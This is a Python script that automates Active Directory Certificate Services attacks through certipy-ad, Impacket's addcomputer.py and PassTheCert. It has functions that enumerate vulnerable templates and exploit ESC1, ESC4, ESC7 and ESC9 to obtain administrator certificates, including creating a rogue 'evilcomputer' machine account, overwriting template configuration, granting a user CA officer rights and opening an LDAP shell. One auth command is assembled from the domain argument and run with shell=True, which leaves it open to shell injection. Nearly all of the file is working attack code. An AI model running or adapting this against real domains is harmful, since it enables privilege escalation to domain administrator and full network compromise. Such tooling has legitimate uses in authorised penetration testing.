import subprocess
import json
import os
import time

def run_certipy_find(username, password, domain, dc_ip=None):
    cmd = [
        "certipy-ad", "find",
        "-u", username,
        "-p", password,
        "-target", domain,
        "-text",
        "-stdout",
        "-vulnerable"
    ]
    if dc_ip:
        cmd += ["-dc-ip", dc_ip]

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy find failed: {e}")
        return None

def save_results_to_json(data, filepath):
    try:
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        with open(filepath, "w") as f:
            json.dump(data, f, indent=4)
        print(f"[+] Results saved to {filepath}")
    except Exception as e:
        print(f"[!] Failed to save results: {e}")

def exploit_esc1(username, password, domain, dc_ip, ca_name, template_name):
    print("[*] Exploiting ESC1 vulnerability...")

    req_cmd = [
        "certipy-ad", "req",
        "-u", username,
        "-p", password,
        "-target", domain,
        "-upn", f"administrator@{domain}",
        "-ca", ca_name,
        "-template", template_name,
        "-key-size", "4096"
    ]

    print(f"[*] Running request command: {' '.join(req_cmd)}")
    try:
        subprocess.run(req_cmd, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy request failed: {e}")
        return

    auth_cmd = f'faketime "$(ntpdate -q {domain} | cut -d \' \' -f 1,2)" certipy-ad auth -pfx administrator.pfx -domain {domain}'
    if dc_ip:
        auth_cmd += f' -dc-ip {dc_ip}'

    print(f"[*] Running auth command: {auth_cmd}")
    try:
        subprocess.run(auth_cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy auth failed: {e}")

def exploit_esc1_domain_computer(username, password, domain, dc_ip, ca_name, template_name):
    print("[*] Exploiting ESC1 vulnerability via Domain Computer account...")
    
    # Step 1: Add computer account
    computer_name = "evilcomputer"
    computer_pass = "Winter2025!"
    
    print("[*] Adding computer account...")
    try:
        subprocess.run([
            "addcomputer.py",
            f"{domain}/{username}:{password}",
            "-computer-name", computer_name,
            "-computer-pass", computer_pass,
            "-dc-host", dc_ip
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to add computer account: {e}")
        return
    
    # Step 2: Request certificate as computer account
    print("[*] Requesting certificate as computer account...")
    try:
        subprocess.run([
            "certipy-ad", "req",
            "-username", f"{computer_name}$",
            "-password", computer_pass,
            "-ca", ca_name,
            "-target", domain,
            "-template", template_name,
            "-upn", f"administrator@{domain}",
            "-dc-ip", dc_ip
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Certipy request failed: {e}")
        return
    
    # Step 3: Extract cert and key
    print("[*] Extracting certificate and key...")
    try:
        subprocess.run([
            "certipy-ad", "cert",
            "-pfx", "administrator.pfx",
            "-nocert",
            "-out", "administrator.key"
        ], check=True)
        
        subprocess.run([
            "certipy-ad", "cert",
            "-pfx", "administrator.pfx",
            "-nokey",
            "-out", "administrator.crt"
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to extract certificate or key: {e}")
        return
    
    # Step 4: Start LDAP shell
    print("[*] Starting LDAP shell with PassTheCert...")
    try:
        subprocess.run([
            "python3", "PassTheCert/Python/passthecert.py",
            "-action", "ldap-shell",
            "-crt", "administrator.crt",
            "-key", "administrator.key",
            "-domain", domain,
            "-dc-ip", dc_ip
        ], check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Failed to start LDAP shell: {e}")

# ... [keep the existing ESC4 and ESC7 functions unchanged] ...
# ESC4
def exploit_esc4(domain, dc_ip, username, password, ca_name, template_name):
    user = f"{username}@{domain}"
    dns_name = f"admin.{domain}"
    upn = f"administrator@{domain}"
    pfx_file = "administrator.pfx"

    # Step 1: Write default config to the template
    subprocess.run([
        "certipy-ad", "template",
        "-username", user,
        "-password", password,
        "-template", template_name,
        "-write-default-configuration",
        "-dc-ip", dc_ip
    ], check=True)

    # Step 2: Request certificate with required SAN
    subprocess.run([
        "certipy-ad", "req",
        "-username", user,
        "-password", password,
        "-ca", ca_name,
        "-target", domain,
        "-template", template_name,
        "-upn", upn,
        "-dc-ip", dc_ip
    ], check=True)

    # Step 3: Authenticate using the obtained certificate
    subprocess.run([
        "certipy-ad", "auth",
        "-pfx", pfx_file,
        "-dc-ip", dc_ip,
        "-domain", domain
    ], check=True)

# ESC7
def exploit_esc7(domain, dc_ip, username, password, ca_name):
    print("[*] Exploiting ESC7 vulnerability...")

    user = f"{username}@{domain}"

    try:
        # Step 1: Add the user as a certificate manager (officer)
        subprocess.run([
            "certipy-ad", "ca",
            "-ca", ca_name,
            "-add-officer", username,
            "-username", user,
            "-p", password
        ], check=True)
        print("[+] Added user as Certificate Manager.")

        # Step 2: Request SubCA certificate
        subprocess.run([
            "certipy-ad", "req",
            "-ca", ca_name,
            "-target", domain,
            "-template", "SubCA",
            "-upn", f"administrator@{domain}",
            "-username", user,
            "-p", password
        ], check=True)
        print("[+] Requested SubCA certificate.")

        # Step 3: Issue the request
        subprocess.run([
            "certipy-ad", "ca",
            "-ca", ca_name,
            "-issue-request", "25",  # Placeholder: adjust if needed
            "-username", user,
            "-p", password
        ], check=True)
        print("[+] Issued request.")

        # Step 4: Retrieve the certificate
        subprocess.run([
            "certipy-ad", "req",
            "-ca", ca_name,
            "-target", domain,
            "-retrieve", "25",  # Placeholder: adjust if needed
            "-username", user,
            "-p", password
        ], check=True)
        print("[+] Retrieved issued certificate.")

    except subprocess.CalledProcessError as e:
        print(f"[!] ESC7 exploitation failed: {e}")

def exploit_esc9(username, password, domain, dc_ip, ca_name, template_name):
    print("\n[!] ESC9 has no specific command or parameter for certipy...")
    print("[!] This exploitation requires a user with GenericAll/GenericWrite permissions")
    
    # Get the privileged user credentials
    privileged_user = input("Who has GenericAll or GenericWrite on the victim account: ")
    privileged_pass = input(f"Password of {privileged_user}: ")
    
    victim_user = username.split('@')[0] if '@' in username else username.split('\\')[-1]
    
    print("\n[*] Exploiting ESC9 vulnerability...")
    
    # Step 1: Update victim's UPN to Administrator
    print("[*] Updating victim's UPN to Administrator...")
    subprocess.run([
        "certipy-ad", "account", "update",
        "-u", f"{privileged_user}",
        "-p", privileged_pass,
        "-user", victim_user,
        "-upn", f"Administrator@{domain}",
        "-dc-ip", dc_ip
    ], check=True)
    
    # Step 2: Request certificate as victim
    print("[*] Requesting certificate as victim...")
    subprocess.run([
        "certipy-ad", "req",
        "-u", f"{victim_user}@{domain}",
        "-p", password,
        "-ca", ca_name,
        "-template", template_name,
        "-dc-ip", dc_ip
    ], check=True)
    
    # Step 3: Reset victim's UPN back to original
    print("[*] Resetting victim's UPN back to original...")
    subprocess.run([
        "certipy-ad", "account", "update",
        "-u", f"{privileged_user}",
        "-p", privileged_pass,
        "-user", victim_user,
        "-upn", f"{victim_user}@{domain}",
        "-dc-ip", dc_ip
    ], check=True)
    
    # Step 4: Authenticate with the certificate
    print("[*] Authenticating with the obtained certificate...")
    subprocess.run([
        "certipy-ad", "auth",
        "-pfx", "administrator.pfx",
        "-dc-ip", dc_ip,
        "-domain", domain
    ], check=True)
